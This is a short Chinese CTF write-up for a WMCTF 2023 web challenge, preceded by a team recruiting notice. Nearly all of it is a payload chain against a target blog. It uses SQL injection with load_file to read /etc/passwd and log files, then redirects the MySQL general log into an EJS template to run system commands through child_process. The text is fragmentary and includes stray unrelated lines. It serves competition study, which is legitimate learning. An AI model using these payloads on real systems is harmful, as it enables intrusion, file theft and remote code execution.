# WMCTF 2023 writeup by Mini-Venom

> 原文: https://www.ctfiot.com/132359.html
> ID: 132359

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组)

Ssti

然后里面有个 /api/debugger/template/test 路由可以调试模板 同样这个渲染的模板文件名是可控的 直接file=刚才设置的日志 index就可以 ssti


```
/admin/../flag
{ "alice@example.com","bob@zhangkeji.com", Ucharlie@sanfeng.com""jom@roomke.com"}
http://b301a747-7ff2-4a8b-bae0-e5938179fb36.wmctf.wm-team.cn/post/11 union select load_file('/etc/passwd'),load_file('/etc/passwd'),load_file('/etc/passwd')/edit
http://b301a747-7ff2-4a8b-bae0-e5938179fb36.wmctf.wm-team.cn/post/11%20union%20select%20load_file('%2Fhome%2Fezblog%2F.pm2%2Flogs%2Fmain-out.log'),load_file('%2Fhome%2Fezblog%2F.pm2%2Flogs%2Fmain-out.log'),load_file('%2Fhome%2Fezblog%2F.pm2%2Flogs%2Fmain-out.log')/edit
CREATE TABLE mysql.general_log (
  event_time timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  user_host mediumtext NOT NULL,
  thread_id int(11) NOT NULL,
  server_id int(10) unsigned NOT NULL,
  command_type varchar(64) NOT NULL,
  argument mediumtext NOT NULL
) ENGINE=CSV DEFAULT CHARSET=utf8 COMMENT='General log'
SET%20GLOBAL%20general_log_file%20%3D%20'%2Fhome%2Fezblog%2Fviews%2Findex.ejs'%3B
select%20'%3C%25%3D%20process.mainModule.require(%22child_process%22).execSync(%22%2Freadflag%22).toString()%20%25%3E'%3B
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/3-1693144035.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/2-1693144035.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/3-1693144036.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/4-1693144037.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/2-1693144038.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/4-1693144039.jpeg)